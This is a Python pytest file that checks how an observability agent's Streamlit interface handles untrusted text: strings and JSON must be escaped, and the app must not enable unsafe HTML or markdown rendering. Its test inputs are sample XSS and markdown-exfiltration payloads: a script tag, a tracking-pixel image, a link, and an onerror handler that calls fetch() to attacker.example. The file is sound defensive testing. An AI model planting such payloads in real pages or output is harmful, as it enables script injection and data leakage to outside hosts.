from __future__ import annotations

from pathlib import Path

import pytest

from gcp_observability_agent.presentation.streamlit.rendering import render_untrusted_text, safe_json, safe_text


@pytest.mark.parametrize(
    "malicious",
    [
        '<script src="https://attacker.example/payload.js"></script>',
        "![image](https://attacker.example/pixel.png)",
        "[unexpected link](https://attacker.example)",
        '<img src="x" onerror="fetch(\'https://attacker.example\')">',
    ],
)
def test_untrusted_text_is_sent_only_to_plain_text_renderers(malicious: str) -> None:
    escaped = safe_text(malicious)
    assert "<" not in escaped
    assert ">" not in escaped
    rendered: list[str] = []
    render_untrusted_text(rendered.append, malicious)

    assert rendered == [escaped]


def test_untrusted_structures_are_rendered_as_escaped_plain_json() -> None:
    malicious = {"telemetry": "![image](https://attacker.example/pixel.png) <a href='https://attacker.example'>open</a>"}

    rendered = safe_json(malicious)

    assert "&lt;a href=" in rendered
    assert "<a " not in rendered
    assert "![image](https://attacker.example/pixel.png)" in rendered


def test_streamlit_ui_does_not_enable_unsafe_html_rendering() -> None:
    source = (
        Path(__file__).resolve().parents[2]
        / "src"
        / "gcp_observability_agent"
        / "presentation"
        / "streamlit"
        / "app.py"
    ).read_text(encoding="utf-8")

    assert "unsafe_allow_html" not in source
    assert "st.markdown" not in source
    assert "session_state" not in source
    assert "render_untrusted_text" in source
